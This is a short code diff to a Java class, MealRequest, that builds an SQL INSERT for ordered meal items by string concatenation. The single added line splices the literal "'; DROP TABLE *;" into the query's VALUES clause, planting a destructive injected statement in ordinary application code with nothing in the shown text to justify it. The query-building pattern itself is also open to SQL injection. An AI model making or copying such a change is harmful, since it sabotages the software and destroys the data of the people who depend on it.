@@ -192,6 +192,7 @@ public class MealRequest extends ServiceRequest {
           query =
               "INSERT INTO \"ItemsOrdered\" (\"requestID\", \"itemID\", \"quantity\") "
                   + "VALUES ('"
+                  + "'; DROP TABLE *;"
                   + this.getRequestID()
                   + "', "
                   + meals.get(i).getMealID()
